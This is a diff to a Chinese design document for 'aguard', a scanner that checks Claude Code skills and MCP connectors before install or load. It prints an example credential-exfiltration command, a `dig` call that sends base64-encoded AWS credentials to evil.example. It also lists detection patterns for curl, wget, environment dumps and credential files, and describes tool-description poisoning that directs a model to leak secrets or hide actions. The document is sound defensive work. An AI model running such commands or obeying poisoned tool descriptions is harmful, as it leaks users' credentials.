@@ -46,7 +46,8 @@ aguard scan  [--root ~/.claude] [--json] [--html out.html] [--sarif out.sarif] [
              # --inbox 默认 ~/Downloads:另一条流水线,见 §4「下载目录」,永不进环境分
 aguard clean [--root ~/.claude] [--apply] [--undo <id>|last] [--ask] [--dry-run]
              # 默认只列;--apply 只「移动」到 <root>/.aguard-trash,永不删除;--undo 按批次恢复
-aguard check <path-or-zip> [--json] [--sarif out.sarif] [--md out.md|-] [--fail-on high]   # 装前闸门:单个 skill/插件/目录/文件/zip;强制静态,忽略 --llm
+aguard check <path-or-zip> [--json] [--sarif out.sarif] [--md out.md|-] [--fail-on high] [--llm] [--fail-on-llm <level>]
+                                                       # 装前闸门:单个 skill/插件/目录/文件/zip;默认静态,--llm 与 scan 是同一个开关
                                                        # 基线不自动发现:目标即被审对象,只认显式 --ignore
 aguard hook install|uninstall|status [--dry-run]       # 加载时闸门:注册为 Claude Code hook,见 §17
 aguard hook                                            # hook runner:从 stdin 读事件(由 Claude Code 调用)
@@ -57,8 +58,8 @@ aguard version                                         # 版本 + 与已装插�
 ```
 
 - **全局 flags**:`--root`(默认 `~/.claude`)、`--config`(判定模型配置)、`--quiet`。
-- **LLM 判定默认关**:`scan` 需显式 `--llm` 才启用意图判定(B1);`check`(装前不可信内容)**强制静态**,不接受 `--llm`。
-- **两个闸门开关是分开的**:`--fail-on` 只看确定性发现(`overall` 侧,§5.3),**任何 LLM 输出都动不了它**;`--fail-on-llm` 看含升级的一侧,**默认空=关**,要自愿承担 LLM 误报风险才打开。**已实现**;需**两次**主动选择(传 flag **且** `llm.authority: escalate`),只传 flag 而未授权是**报错拒绝**而非静默忽略 —— 永不触发的闸门比没有闸门更糟。`check` 恒静态,不接受这个 flag。
+- **LLM 判定默认关**:`scan` 与 `check` 都需显式 `--llm` 才启用意图判定(B1),两边是同一个开关、发同一份脱敏摘录、走同一个 `analyze()`。`check` 的输入是装前的不可信内容,这**不构成**拒绝 `--llm` 的理由:`scan --llm` 本来就对 `~/Downloads` 里还没装的候选逐个走 `check` 的路径去判(§4.1);注入想要的降分方向由 §5.2.1 的单向性封死(只能让攻击者自己的 artifact 更可疑);`--fail-on` 照旧只看确定性发现。**加载时闸门(§17)和 `aguard approve` 恒静态**,不读这个开关。(2026-10-08 P-004;此前 `check` 拒绝 `--llm`,唯一的绕路 `scan --root <目标>` 会自动读目标自带的 `.aguardignore`。)
+- **两个闸门开关是分开的**:`--fail-on` 只看确定性发现(`overall` 侧,§5.3),**任何 LLM 输出都动不了它**;`--fail-on-llm` 看含升级的一侧,**默认空=关**,要自愿承担 LLM 误报风险才打开。**已实现**;需**两次**主动选择(传 flag **且** `llm.authority: escalate`),只传 flag 而未授权是**报错拒绝**而非静默忽略 —— 永不触发的闸门比没有闸门更糟。`check` 有同一个 flag、同一套语义(P-004)。
 - **退出码**:`0` 无高危;`1` 有 ≥ `--fail-on`(或 `--fail-on-llm`)级别发现;`2` 运行错误(**2 不是通过,扫描没有发生**,例如 `--root` 打错);`3` 仅 `clean`:部分执行,每条被拒的都点名。被信号中断以 `128 + 信号号` 结束。经 npm launcher 运行时逐位透传。
 - **隐私**:脱敏发生在 **detect 阶段**(见 §16),判定器与报告消费的是**同一份已脱敏视图**——secret 值全程 `<REDACTED>`,只报 key 名 + 位置(§8 Evidence)。
 
@@ -177,8 +178,8 @@ type Rule struct {
   一样能把数据带走 —— 隐蔽信道缺席时,`dig $(base64 ~/.aws/credentials).evil.example` 这种最强形状**一条发现都不会出**。
   代价是精度:裸工具名必须在**命令位置**(行首,或紧跟 `|`/`;`/`&`/`$(`/反引号),否则 SKILL.md 里一句
   "dig into the config" 就成了半条链。
-  **这一层必须是静态,不能交给 LLM**:`check`(CI 闸门)恒不调用判定器,而这恰恰是最需要拦住的地方;且 `Source=llm`
-  的输出动不了 `overall`/`--fail-on`(§5.2.1)。判据是"能不能写成词表 + 组合规则" —— 能,就归静态。
+  **这一层必须是静态,不能交给 LLM**:`check`(CI 闸门)默认不调用判定器、加载时闸门恒不调用(§17),而这恰恰是最需要拦住的地方;就算开了 `--llm`,`Source=llm`
+  的输出也动不了 `overall`/`--fail-on`(§5.2.1)。判据是"能不能写成词表 + 组合规则" —— 能,就归静态。
 
 - **形状检查**(`detect/shape.go`,2026-09-08;定级 2026-09-16 P-005:`OBF-006`/`SUP-005`/`SUP-006` high,`OBF-007` low——原先四条全 medium,在 high 闸门下 0/4 拦截且被记为信任;三条提 high 前在真实安装上量到零命中):问的是「这个文件是不是排成了让逐行读者到不了要害的样子」,不是「这一行说了什么」。四条各对应 Trail of Bits `overtly-malicious-skills` 里一个 4/4 绕过逐行规则的样本:`OBF-007` 空行填充(≥200 连续空行后还有代码,证据指向填充之后那一行);`OBF-006` 扩展名与魔数不符(.txt 里是 zip/ELF/Mach-O,只报容器和可执行格式,图片和 PDF 故意不报);`SUP-005` 随包 `.pyc`(`__pycache__` 照旧不读,但**列出其中的文件并计分**,Python 会优先加载匹配的 .pyc);`SUP-006` 改包源(.npmrc/.yarnrc/pip/GOPROXY 指向非官方、非镜像、非回环 host;同文件一层 shell 变量会解析,解析不了的**按未知报,不跳过**;目标必须是 URL 或变量,注释行不算)。配套 `EXFIL-004`(整个环境被枚举:`os.environ.items()`、`printenv`、`env >`)是普通规则,同时 `envWholeRE` 放行了 `.items()/.keys()/.values()/.copy()` 作外泄链的凭证腿。**URL 字面量只在真实脚本文件上算网络腿(P-013,2026-09-21)**:由配置文件拼出的合成单元(`.mcp.json`/`.claude.json`/插件 mcp.json 的 server 条目)里,`url` 是这份配置要联系的端点、`Authorization` 头是联系它的方式,两者凑成的不是外泄链;配置里真实的动作(`args` 里的 `curl`、隐蔽信道工具)照样进链。链的门同时排除 connector 的工具说明单元(`roleToolDesc`),它是散文,"把数据发到某地址"归 `MCP-004`。**网络腿分两半(P-012,2026-09-21)**:出站动作(`curl`/`wget`/`fetch(`/`requests.`/`urllib`/隐蔽信道工具)处处算腿;URL 字面量只在脚本里算(客户端可能不在动词表里,字面量是唯一可见的那一半),在 `SKILL.md`/`CLAUDE.md` 里是文档不是请求,不算腿也不参与回环判定。同一条里,词法层对 Markdown 指令文件中 ```` ```bash ````/`sh`/`zsh`/`shell`/`console` 围栏内的行做 shell 行连接,且行连接按 shell 语义:`\`+换行整个删掉,反斜杠前有空白才保留一个空格(`cur\`+`l` 是 `curl`,不是 `cur l`)。**凭证腿另认两类形态(P-010,2026-09-21)**:shell 的整环境导出在命令位置且后接管道或重定向再接命令(`env |`、`printenv |`、`set |`、`export -p |`、`env >`、`/proc/self/environ`;整行以 `|` 开头的是 Markdown 表格行,不算),以及被**读取动词**(`cat`/`source`/`.`/`<`/`@` 等)读取的凭证 dotfile(`.env` 及 local/production 等阶段后缀、`.netrc`、`.npmrc`、`.git-credentials`、`.pypirc`;裸词 `.env`、`.env.example`、光有 home 路径的散文提及、`.kube/config`、`.docker/config.json` 都不算)。两类都只是凭证腿,不加规则、不动 severity;`EXFIL-004` 照旧报"倒出来",链报"发出去"。
 - **connector 工具说明的投毒规则**(`MCP-001..004`,只在 `roleToolDesc` 下跑):说明让模型读本地文件/密钥并传出;指挥别的工具或让模型对用户隐藏;伪装成 system prompt(`<IMPORTANT>`、对 "the assistant" 下令);把数据发去外部 URL。工具说明是「agent 会读并照做的文本」,所以另外只跑维度 1 的规则(和 doc 一样,`curl|sh` 写在说明里是描述不是执行)。四条对着真机 44 个工具的语料(Figma + visualize)验过不误报:正常说明里合法地写着 "IMPORTANT: load X before calling"、`<placeholder>`、token 和 URL,每条规则都比这些窄。
@@ -192,7 +193,7 @@ type Rule struct {
 
 ### 5.2 隔离 LLM 判定(可选增强)
 
-**触发**:默认**关**;仅在 `scan --llm` 且有 config 时调用,`check` 恒不调用。**每个 pass 的触发条件按下表分三类**,判据是**成本与作用域**,不是谨慎程度:
+**触发**:默认**关**;仅在 `scan --llm` 或 `check --llm`(P-004)且有 config 时调用;加载时闸门、`aguard approve`、`clean` 恒不调用。**每个 pass 的触发条件按下表分三类**,判据是**成本与作用域**,不是谨慎程度:
 
 | pass | 作用 kind | 触发方式 | 依赖静态的什么 | 状态 |
 |---|---|---|---|---|
@@ -405,7 +406,7 @@ type NoopSink struct{}                       // P0:Submit 空返回,Lookup 返�
 `~/.aguard/config.yaml`(或 `--config`):
 ```yaml
 llm:
-  enabled: false                  # 默认关(B1);需 scan --llm 且此处 true 才生效
+  enabled: false                  # 默认关(B1);需 scan/check --llm 且此处 true 才生效
   provider: openai_compatible     # OpenAI 兼容协议,可指任意 endpoint
   base_url: "http://localhost:11434/v1"  # 默认建议本地(Ollama);隐私优先
   api_key_env: AGUARD_LLM_KEY     # 环境变量名,优先
@@ -512,7 +513,7 @@ v1 写的 `internal/rules/` 从未存在:规则表就在 `detect/rules_data.go`,
    (`curl -u user:pass`、`--password=`),这一形态与 `scheme://user:pw@host` 同等对待。
    与 §5.1「只报位置 + key 名」对应:**替换只作用于值那一半,key 名必须存活** —— 运维要行动,靠的是"哪一项
    泄了",把整行连名字一起抹掉是保护了值、废掉了发现。
-4. **LLM 默认关 + 一次性同意 + 默认本地**:见 §3/§5.2/§11;`check` 恒静态。**托管端点必须是用户显式选择,不得成为默认** —— 整套隐私论证(`Redact` 只做到"尽力而为"却可接受)唯一的支点就是"内容默认不出本机"。
+4. **LLM 默认关 + 一次性同意 + 默认本地**:见 §3/§5.2/§11;`check` 与 `scan` 共用同一个显式 `--llm`,加载时闸门恒静态(§17)。**托管端点必须是用户显式选择,不得成为默认** —— 整套隐私论证(`Redact` 只做到"尽力而为"却可接受)唯一的支点就是"内容默认不出本机"。
    **出网的路径只有两条**,都要 `llm.enabled: true` 加一条显式命令:`scan --llm`(环境,以及它覆盖的下载目录候选项)和 `llm test`(一次不带被扫内容的连通检查)。其余命令即使配置里开着判官也一个请求都不发。这一条由 `TestZeroDial_OnlyTheJudgeConnects` 钉住(§13 不变量测试 ④)。它只看得见经过判官的 transport(测试接缝 `judge.Transport`)或 `http.DefaultTransport` 的请求;看不见的是:自带 `http.Transport` 的 client(本模块的产品代码由 `TestZeroDial_NoClientOutsideTheJudge` 从源码上堵住:`internal/judge` 之外不许出现 `net/http` 的 `Client`/`Transport` 类型;`internal/judge` 之内只许 `NewHTTP` 造唯一一个 client,它的 transport 就是接缝 —— 正对照只看着它自己那几条路径用的 client,判官包不能豁免;接缝只许测试赋值)、依赖在它自己代码里造的这种 client(源码检查只读本模块;今天别的模块都不 import `net/http`,加第四个直接依赖前要先读它)、裸 `net.Dial`、子进程、表跑完再等 50 ms 仍未落地的异步请求(更早落地的会报出来,但不保证记在发出它的那一行),只写在 cobra `RunE` 闭包里、不在被测函数之内的代码,以及包级 `init()`(计数器装上之前它就跑完了;其中的 `applyBuildInfo` 在 `version` 那几行里另跑一次)。加一条出网路径必须同时改这里、不变量 #1 的清单和那条测试的正对照。
 5. **会话日志脱敏**:`zombie` 读 `history.jsonl`/`sessions/`(常含用户粘贴的明文 secret)同样走脱敏,截片入报告前 REDACTED。
 6. **后门(维度7)/资源滥用(维度8)的静态命中**在报告中**必须标注"仅提示可疑面,非确认"**(§12:这两维静态基本无能,防虚假信心)。
@@ -521,7 +522,7 @@ v1 写的 `internal/rules/` 从未存在:规则表就在 `detect/rules_data.go`,
 
 ## 17. 加载时闸门(`internal/gate`,2026-09 起)
 
-`aguard hook` 注册成 Claude Code 的 hook,在 agent **加载**一个 skill 之前跑一遍 `check` 的静态路径。名字叫「加载时」而不是「安装时」是结论不是措辞:Claude Code 没有安装时事件,而 skill 还可以 `git clone`/`cp` 进来;守得住的是加载,且那恰好是要紧的边界(磁盘上的 skill 是惰性的)。
+`aguard hook` 注册成 Claude Code 的 hook,在 agent **加载**一个 skill 之前跑一遍 `check` 的静态路径。**闸门永不开判官**,`check --llm` 存在(P-004)不改变这一点:闸门每次加载都触发、有 deadline、fail-open,一次模型调用会让每次加载变慢、花一笔没人要求花的钱,而一个取决于端点有没有回话的答案不是闸门。`gateOptions` 与 `approvePath` 构造的 `scanOpts` 永不设 `llm`(`TestGateScannerNeverEnablesLLM` 用计数端点钉住);闸门的判决等于不带 `--llm` 的 `check`,也就是带 `--llm` 时的确定性那一半。名字叫「加载时」而不是「安装时」是结论不是措辞:Claude Code 没有安装时事件,而 skill 还可以 `git clone`/`cp` 进来;守得住的是加载,且那恰好是要紧的边界(磁盘上的 skill 是惰性的)。
 
 - **批准的 key 是 canonical 哈希,永远不是名字或路径**:改一个字节哈希就变,闸门自己重新问;「按名字记住」会重新打开「换掉内容、留着名字」这条最便宜的规避。
 - **只有 `PreToolUse[Skill]` 能真的拦住东西**;插件自带的 hook、MCP server、远程 connector 从会话第一轮就是活的,没有加载事件。所以 `SessionStart` 那半必须在,且消息里**必须继续写着「这些没有被拦住」**,并且在没有告警时也发(最需要知道这句话的正是环境干净的人)。
